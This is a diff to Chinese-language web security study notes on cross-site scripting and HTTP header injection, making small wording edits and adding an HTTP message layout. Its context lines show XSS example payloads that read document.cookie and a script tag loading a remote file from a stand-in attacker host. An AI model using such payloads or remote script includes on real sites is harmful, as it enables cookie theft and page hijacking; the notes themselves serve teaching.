@@ -5,13 +5,13 @@
 ### 跨站脚本攻击 | Cross-Site Scripting | XSS
 
 * 跨站脚本攻击依赖动态脚本注入
-1. 将输入动态插入 html 中
+1. 将输入 (input) 动态插入 html 中
 ```js
   <input type="text" id="username" name="username" />
   document.getElementsByTagName("body")[0].innerHTML = username;
   // username ===> "<script>alert(document.cookie)</script>
 ```
-2. URI 查询字符串插入 表单
+2. URL 查询字符串插入 表单 
 ```js
   // url ===> www.example.com/login?ID=yama
   // ID ===> "><script>alert(document.cookie)</script><span s="
@@ -19,7 +19,7 @@
     ID <input type="text" value="ID"/>
   </form>
 ```
-3. 动态插入 js 文件
+3. 动态插入 js 文件 (也是利用 url 插入)
 ```js
   <script src="http://hack.cn/xss.js"></script>
   // xss.js
@@ -52,6 +52,14 @@
 ```
 
 ### HTTP 首部注入攻击 | HTTP Header Injection
+
+```html
+  <!-- http 报文格式 -->
+  <line>
+  <header>
+  <blank-line>
+  <body>
+```
 
 1. http 响应截断攻击
 
